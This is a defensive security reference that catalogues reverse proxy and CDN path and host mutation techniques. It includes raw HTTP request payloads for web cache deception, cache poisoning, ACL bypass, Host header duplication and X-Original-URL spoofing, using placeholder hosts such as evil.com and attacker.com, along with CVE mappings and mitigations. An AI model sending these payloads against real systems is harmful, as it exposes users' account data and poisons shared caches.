# Reverse Proxy Misrouting — Path & Host Mutation Taxonomy (2025)

> Extracted from the [HTTP Request Smuggling & Desync — Mutation Taxonomy](http-request-smuggling.md). This document covers mutations that exploit **interpretation discrepancies between reverse proxies/CDNs/caches and origin servers** in URL path resolution and host identification — independent of HTTP Request Smuggling but frequently combined with it.



---



## Core Concept

Reverse proxy misrouting mutations target a single architectural assumption: **the proxy and the origin will resolve the same URL to the same resource and agree on the target host.** When this assumption fails, the proxy routes, caches, or applies access controls based on one interpretation while the origin processes a completely different request.

Two distinct mutation categories exist:

- **Request-Line & URL Mutations (§3)**: Mutate the *URL path* so the proxy and origin disagree on *which resource is being requested*. This produces **path mismatch** — the root cause of Web Cache Deception, Web Cache Poisoning, and ACL bypass.

- **Host Identification Mutations (§4)**: Mutate the *host determination mechanism* so the proxy and origin disagree on *which virtual host or backend is the target*. This produces **host mismatch** — the root cause of routing manipulation, cache poisoning, and SSRF.

These categories are independent but composable. A real-world attack often chains §3 + §4, and may additionally leverage HTTP Request Smuggling (§1–§2, §6–§7 in the [parent document](http-request-smuggling.md)) to deliver the misrouted request through a desynchronized channel.



---



## §3. Request-Line & URL Mutations

Mutations that cause a proxy/CDN/cache and the origin server to **map the same URL to different resources**. These produce *path mismatch* and are the basis for Web Cache Deception, Web Cache Poisoning, and ACL bypass.

| Technique | Mutation Example | Mismatch Effect |
|---|---|---|
| **Path suffix confusion** | `/account.php/image.png` | Cache sees `.png` → static; origin executes `account.php` |
| **URL encoding asymmetry** | `%2F` vs `/`, double-encoding `%252F` | Differences in normalization depth and timing |
| **Path parameter (`;`)** | `/admin;.js` | Servers like Tomcat strip after `;`; others treat it as part of the path |
| **Dot segment normalization** | `/admin/..%2Fsecret` | Proxy normalizes first vs origin receives the encoded form |
| **Null byte insertion** | `/admin%00.png` | C-based servers truncate at null |
| **Backslash/slash confusion** | `\admin` → `/admin` | Windows/IIS path normalization |
| **Module pipeline mismatch** | Apache `mod_rewrite` → `mod_proxy` URL interpretation divergence | CVE-2024-38474 (Apache HTTP Server RCE) |
| **URL decode ordering error** | ModSecurity URL-decodes before query separation | CVE-2024-1019: encoded payloads bypass path-based WAF rules |
| **WAF exception paths** | `/.well-known/acme-challenge/` and similar | WAF skips inspection on these paths → direct origin attack (Cloudflare ACME bypass, 2025) |



### Path Mismatch Attack Patterns

**Web Cache Deception (WCD)**: Attacker lures victim to `/account/settings/image.png`. Cache sees `.png` → caches the response as static. Origin sees `/account/settings` (ignoring the suffix) → returns sensitive account data. Subsequent requests to the same URL serve the cached sensitive data to the attacker.

**Web Cache Poisoning (WCP)**: Attacker sends a request that poisons the cache with a malicious response for a legitimate URL. Unlike WCD (which caches a legitimate response at a wrong key), WCP caches a *modified* response (e.g., injected headers, redirects) at the correct key.

**ACL Bypass**: Proxy enforces access controls based on its path interpretation (e.g., `/admin` → deny). URL mutation causes the proxy to see a benign path while the origin resolves to the protected resource.



---



## §4. Host Identification Mutations

Mutations that create contradictions between the multiple mechanisms for determining a request's target host (Host header, absolute URI, `:authority`, `X-Forwarded-Host`, etc.).

| Technique | Mutation Example | Mismatch Effect |
|---|---|---|
| **Host header duplication** | `Host: evil.com\r\nHost: target.com` | First-wins vs last-wins policy |
| **Absolute URI + Host conflict** | `GET http://evil.com/ HTTP/1.1\r\nHost: target.com` | RFC mandates absolute URI takes precedence, but implementations vary |
| **X-Forwarded-Host injection** | `X-Forwarded-Host: evil.com` | Pollutes internal routing and cache key generation |
| **`:authority` vs Host** | H2 `:authority` and post-downgrade Host header disagree | Virtual host selection and routing confusion |
| **Port inclusion/omission** | `Host: target.com:443` vs `Host: target.com` | Cache key splitting, virtual host mapping differences |
| **Internal header spoofing** | `X-Original-URL: /admin`, `X-Rewrite-URL: /admin` | Framework uses these headers instead of the actual request path for routing |



### Host Mismatch Attack Patterns

**Cache Poisoning via Host Header**: If the cache keys on `Host` but the origin uses `X-Forwarded-Host` to generate URLs in the response body, an attacker can inject `X-Forwarded-Host: evil.com` → the cached response contains `evil.com` references for all subsequent users.

**Routing Manipulation / SSRF**: Disagreement between proxy and origin on the target host can route requests to internal backends, bypass virtual host isolation, or trigger SSRF through backend routing logic.

**Virtual Host Confusion**: H2 `:authority` vs HTTP/1.1 `Host` disagreement after downgrade can cause the proxy to route to one virtual host while the origin selects a different one — potentially exposing admin interfaces or internal APIs.



---



## Payload Examples

### §3. Web Cache Deception — Path Suffix Confusion

```
GET /account/settings/logo.png HTTP/1.1\r\n
Host: vulnerable.com\r\n
\r\n
```

- Cache sees `.png` extension → classifies as static → caches the response.
- Origin ignores `/logo.png` suffix → serves `/account/settings` (sensitive user data).
- Attacker requests the same URL → receives cached sensitive data.

### §3. ACL Bypass — Path Parameter Injection

```
GET /admin;.js HTTP/1.1\r\n
Host: vulnerable.com\r\n
\r\n
```

- Proxy/CDN sees `.js` extension → classifies as static, bypasses authentication rules.
- Tomcat strips everything after `;` → resolves to `/admin` → serves admin panel.

### §3. ACL Bypass — Dot Segment + Encoding

```
GET /public/..%2Fadmin/secret HTTP/1.1\r\n
Host: vulnerable.com\r\n
\r\n
```

- Proxy sees `/public/..%2Fadmin/secret` → ACL allows `/public/*`.
- Origin decodes `%2F` → normalizes to `/public/../admin/secret` → `/admin/secret`.

### §4. Host Header Poisoning for Cache Poisoning

```
GET /static/main.js HTTP/1.1\r\n
Host: vulnerable.com\r\n
X-Forwarded-Host: evil.com\r\n
\r\n
```

- Cache keys on `Host: vulnerable.com` + path.
- Origin application uses `X-Forwarded-Host` to generate absolute URLs in the response body.
- Cached response now contains `evil.com` references → all subsequent users receive poisoned content.

### §4. Host Header Duplication — Routing Manipulation

```
GET /api/internal HTTP/1.1\r\n
Host: public.vulnerable.com\r\n
Host: admin.vulnerable.com\r\n
\r\n
```

- Proxy uses first `Host` header → routes to public backend, ACL allows.
- Origin uses last `Host` header → resolves to `admin.vulnerable.com` virtual host.

### §4. Internal Header Spoofing — Path Override

```
GET /safe-page HTTP/1.1\r\n
Host: vulnerable.com\r\n
X-Original-URL: /admin/users\r\n
\r\n
```

- Proxy routes based on `/safe-page` → no ACL restriction.
- Framework (e.g., Symfony, older IIS/ASP.NET) reads `X-Original-URL` → overrides the request path to `/admin/users`.

### §3 + §4 Composite: Cache Deception + Host Confusion

```
GET /account/settings/style.css HTTP/1.1\r\n
Host: vulnerable.com\r\n
X-Forwarded-Host: attacker.com\r\n
\r\n
```

- Cache: `.css` extension → static → caches. Keys on `Host: vulnerable.com`.
- Origin: ignores suffix, serves `/account/settings`. Uses `X-Forwarded-Host` for asset URLs.
- Result: cached response contains sensitive data with attacker-controlled asset URLs.



---



## Attack Scenario Mapping

| Scenario | Architecture | Primary Mutation Categories |
|---|---|---|
| **Web Cache Deception (WCD)** | CDN/cache + origin with path suffix leniency | §3 (path suffix, path parameter, encoding) |
| **Web Cache Poisoning (WCP)** | CDN/cache + origin using host-derived headers in responses | §4 (X-Forwarded-Host, Host duplication) |
| **ACL / Authentication Bypass** | Proxy enforcing path-based ACLs + origin with different path resolution | §3 (dot segments, encoding, path parameters) + §4 (internal header spoofing) |
| **Virtual Host Confusion** | H2→1.1 downgrade + virtual host routing based on Host header | §4 (`:authority` vs Host) |
| **SSRF via Routing Manipulation** | Proxy + origin with host-based backend selection | §4 (Host duplication, absolute URI) |



---



## CVE / Bounty Mapping

| Mutation Combination | CVE / Case | Impact / Bounty |
|---|---|---|
| §3 (module pipeline mismatch) | CVE-2024-38474 (Apache HTTP Server) | RCE via `mod_rewrite` → `mod_proxy` path confusion |
| §3 (URL decode ordering) | CVE-2024-1019 (ModSecurity v3) | Complete bypass of path-based WAF rules |
| §3 (WAF exception path) | Cloudflare ACME path bypass (2025.10) | `/.well-known/acme-challenge/` exempt from WAF → direct origin attack |



---



## Detection & Defense

| Approach | Description |
|---|---|
| **Normalize-then-route** | Apply URL normalization (decode, resolve dot segments, strip path parameters) *before* routing and ACL decisions — not after |
| **Cache key hardening** | Include full normalized path + all host-related headers in cache key; reject requests with duplicate Host headers |
| **Strip untrusted headers** | Drop `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL` at the edge unless explicitly required |
| **Consistent path resolution** | Ensure proxy and origin use identical URL parsing libraries or enforce RFC-strict normalization at the edge |
| **H2 pseudo-header validation** | After downgrade, verify `:authority` matches the generated `Host` header; reject mismatches |
| **Extension-based caching rules** | Never cache based solely on file extension; use `Cache-Control` / `Vary` headers from the origin |



---



## References

- PortSwigger — *Web Cache Deception* and *Web Cache Poisoning* research series (2017–2025).
- Orange Tsai — *Breaking Parser Logic: Take Your Path Normalization Off and Pop 0days Out* (Black Hat USA 2018). Path parameter, backslash, dot segment normalization attacks.
- CVE-2024-38474 — Apache HTTP Server `mod_rewrite` → `mod_proxy` URL interpretation divergence → RCE.
- CVE-2024-1019 — ModSecurity v3 URL decode ordering error → complete WAF rule bypass.
- Cloudflare ACME path bypass (2025.10) — `/.well-known/acme-challenge/` exempt from WAF inspection.
- RFC 3986 — *Uniform Resource Identifier (URI): Generic Syntax*. Path normalization, percent-encoding, dot segment resolution.
- RFC 9110 — *HTTP Semantics* (2022). §7.1 (Determining the Target Resource), §7.2 (Host and :authority).
- RFC 9113 — *HTTP/2* (2022). Pseudo-header requirements, `:authority` semantics.



---



*This document was created for defensive security research and vulnerability understanding purposes.*
